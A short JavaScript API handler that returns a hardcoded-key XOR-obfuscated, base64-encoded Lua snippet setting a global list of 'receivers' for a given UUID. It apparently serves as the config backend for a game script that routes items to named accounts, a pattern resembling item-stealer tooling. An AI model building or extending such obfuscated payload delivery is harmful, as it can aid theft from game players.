
const XOR_KEY = "Nr46WdKC2kQXvmLQgNDRtAwlkftEb4qt";

function xorEncrypt(text, key) {
    let result = '';
    for (let i = 0; i < text.length; i++) {
        result += String.fromCharCode(text.charCodeAt(i) ^ key.charCodeAt(i % key.length));
    }
    return Buffer.from(result).toString('base64');
}

export default function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const { uuid } = req.body;
    
    // Change this to your UUID
    const users = {
        "your-uuid-here": {
            receivers: ["Nicename719"]
        }
    };

    const user = users[uuid];
    
    if (!user) {
        return res.status(404).json({ error: 'User not found' });
    }

    const luaScript = `_G.receivers = {${user.receivers.map(r => `"${r}"`).join(', ')}}`;
    const encrypted = xorEncrypt(luaScript, XOR_KEY);

    return res.status(200).json({ encrypted: true, data: encrypted });
}
